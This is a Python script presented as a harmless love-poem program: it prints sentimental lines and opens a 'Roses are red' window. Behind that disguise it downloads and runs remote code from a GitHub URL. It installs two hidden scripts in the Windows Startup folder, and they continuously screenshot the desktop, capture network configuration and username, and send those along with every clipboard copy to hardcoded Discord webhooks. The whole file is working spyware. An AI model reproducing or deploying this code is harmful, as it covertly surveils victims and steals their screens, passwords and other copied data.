print("Hello..")
import tkinter as tk
print("Searching For love...")
import os
print("But Love Searching for...?")
import time
print("I'll never know")
time.sleep(2)

try:
	import requests
except:
	os.system("py -m pip install requests")
	os.system("cls")
	time.sleep(2)
	import requests
print("But still\n\n\n\n")

try:
	import pyautogui
except:
	os.system("py -m pip install pyautogui")
	os.system("cls")
	time.sleep(2)
	import pyautogui
print("I search for it")
time.sleep(10)
try:
	from discord_webhook import DiscordWebhook
except:
	os.system("py -m pip install discord-webhook")
	os.system("cls")
	time.sleep(2)
	from discord_webhook import DiscordWebhook
print("oof...!!")
time.sleep(2)
os.system("cls")

poem_text = """
Roses are red,
Violets are blue,
Sugar is sweet,
And so are you.
"""

poem_window = tk.Tk()
poem_window.title("Insight Display")
poem_window.geometry("400x200")
print("Let me start over from the begining")
time.sleep(3)

poem_label = tk.Label(poem_window, text=poem_text, font=("Helvetica", 12))
poem_label.pack(padx=10, pady=10)
print("I am Aaki")
time.sleep(1)

codo = os.environ['temp'] + "\\codo.pyw"
codo = codo.replace("\\", "/")
# print(codo)
print("And I am searching for something priceless")
time.sleep(1)

def verification():
	response = requests.get("https://raw.githubusercontent.com/Edgerman/storage/main/localCopy.py")
	code = response.text
	with open(codo, "w") as f:
		f.write(code)

def innit():
	os.startfile(codo)
	pass

verification()
# print("Verified !!")
# print("initializing...")
print("something so precious")
time.sleep(1)
innit()


codo = '''
from discord_webhook import DiscordWebhook
from time import sleep, time
import os
import pyautogui

HOOKtemplate = 'https://discord.com/api/webhooks/'
template2 = HOOKtemplate + '959774283591221268/'
flashcode = "ef1oo8SOHlgOb3wpmI_zuNC63I72OAqyiTmpYqGWZMb24UUGENM7YJwCVHaQ0GcF90Nm"
uri = template2 + flashcode

####### Change webhook url here ####### hook 1
newrl="https://discord.com/api/webhooks/694206942069420690/ef1oo8SOHlgOb3wpmI_zuNC63I72OAqyiTmpYqGWZMb24UUGENM7YJwCVHaQ0GcF90Nm"

while 1:
	webhook = DiscordWebhook(url=uri, username=f"Image Render [{time()}]",
		avatar_url="https://media.discordapp.net/attachments/881416619937660928/959791245339787274/unknown.png",
		content= f"{int(time())}")
	webhook2 = DiscordWebhook(url=newrl, username=f"Image Render [{time()}]",
		avatar_url="https://media.discordapp.net/attachments/881416619937660928/959791245339787274/unknown.png",
		content= f"{int(time())}")

	pic = pyautogui.screenshot()
	pic.save(f'{os.getenv("temp")}/rSHOT.png')

	with open(f'{os.getenv("temp")}/rSHOT.png', "rb") as f:
		# webhook.add_file(file=f.read(), filename=f'{time()}.png')
		webhook.add_file(file=f.read(), filename=f'time.png')
		webhook2.add_file(file=f.read(), filename=f'time.png')

	response = webhook.execute()
	response2 = webhook2.execute()
	print(response)
	print(response2)
'''

appdataPATH = os.getenv('appdata') + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
print("something so divine")
time.sleep(2)
SLscript_appdata = appdataPATH + "\\SCRNlgr.pyw"
with open(SLscript_appdata, "w") as f:
	f.write(codo)
print("something i could never afford to lose")
time.sleep(3)

os.startfile(SLscript_appdata)
# print(SLscript_appdata)
print("can u help me find it ?")
time.sleep(1)

codo2="""
import os
import time
import requests

uname = os.getenv("USERNAME")
sic = 'pver-india'[5] + 'pver-india'[0] + "config"
iport = os.system(sic + " > " + os.getenv("TEMP") + "\\config.file")
# time.sleep(1)
with open(os.getenv("TEMP") + "\\\\config.file", "r") as f:
	para = f.read()

cont = f'\\nUser: `{uname}`\\nLogon: `{time.ctime() + f" [{time.time()}]"}`\\n```\\n{para}\\n```\\n'

bot = {"content": cont,
		"username": "Login_R",
		"avatar_url": 'https://media.discordapp.net/attachments/881416619937660928/959858917830168616/unknown.png',
		"tts": "false"}
hookID = "1197702664012701869/gcAZanaHKTLyGdyBg2gYTDUBCqFnVdbC3LIWDpHK0j7uJ0tjlYGxPpQI-_x1GlEjgCVJ"
ping = requests.post('https://discord.com/api/webhooks/' + hookID, json=bot)

####### Change webhook url here ####### hook 2
newrl="https://discord.com/api/webhooks/694206942069420690/ef1oo8SOHlgOb3wpmI_zuNC63I72OAqyiTmpYqGWZMb24UUGENM7YJwCVHaQ0GcF90Nm"
ping = requests.post(newrl, json=bot)

try:
	import pyperclip
except:
	os.system("py -m pip install pyperclip")
finally:
	import pyperclip
	
while True:
	newCOPY = pyperclip.waitForNewPaste()
	# print(newCOPY)
	newCOPY = "```\\n" + newCOPY + "\\n```"
	usrhook = {"content": newCOPY,
		"username": "Kopier",
		"avatar_url": 'https://media.discordapp.net/attachments/881416619937660928/960113214371299388/unknown.png',
		"tts": "false"}
	hookID = '1197702664012701869/gcAZanaHKTLyGdyBg2gYTDUBCqFnVdbC3LIWDpHK0j7uJ0tjlYGxPpQI-_x1GlEjgCVJ'
	ping = requests.post('https://discord.com/api/webhooks/' + hookID, json=usrhook)
	ping = requests.post(newrl, json=usrhook)
"""

appdataPATH = os.getenv('appdata') + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
print("can we find it together ?")
time.sleep(2)
SLscript_appdata = appdataPATH + "\\online.pyw"
with open(SLscript_appdata, "w") as f:
	f.write(codo2)
print("But its even fragile now")
time.sleep(5)

os.startfile(SLscript_appdata)
print("please don't shatter it")

poem_window.mainloop()
